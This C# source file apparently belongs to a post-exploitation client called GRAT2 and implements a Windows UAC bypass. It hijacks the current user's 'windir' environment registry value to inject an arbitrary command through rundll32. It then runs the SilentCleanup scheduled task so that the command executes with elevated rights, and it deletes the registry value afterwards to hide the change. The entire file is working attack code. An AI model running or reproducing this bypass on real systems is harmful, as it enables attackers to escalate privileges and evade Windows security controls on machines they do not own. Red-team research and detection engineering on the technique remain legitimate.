using Microsoft.Win32;
using System;
using GRAT2_Client.PInvoke;

namespace GRAT2_Client.Tokens_UAC
{
    class UAC_Bypass
    {
        public static string Disk(string[] arguments)
        {
            //https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-SilentCleanup-to-bypass-UAC/
            //https://github.com/chryzsh/Aggressor-Scripts/blob/master/uac-bypass/uac_bypass_silentcleanup.cs

            string command = arguments[1];

            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "C:\\Windows\\System32\\rundll32.exe " + command + " & ", RegistryValueKind.String);
                key.Close();
            }
            catch(Exception ex)
            {
                return ex.Message;
            }

             System.Threading.Thread.Sleep(5000);

            try
            {
                string[] schtaskcmd = { "null", @"c:\windows\system32\schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I" };
                Execute.RunCmd(schtaskcmd);
 
            }
            catch (Exception ex)
            {
                return ex.Message;
            }

            var ThisIstheKey = Registry.CurrentUser.OpenSubKey(@"Environment", true);
            ThisIstheKey.DeleteValue("windir");
            ThisIstheKey.Close();
            return "Bypass Executed Successfully!";

        }

    }
}
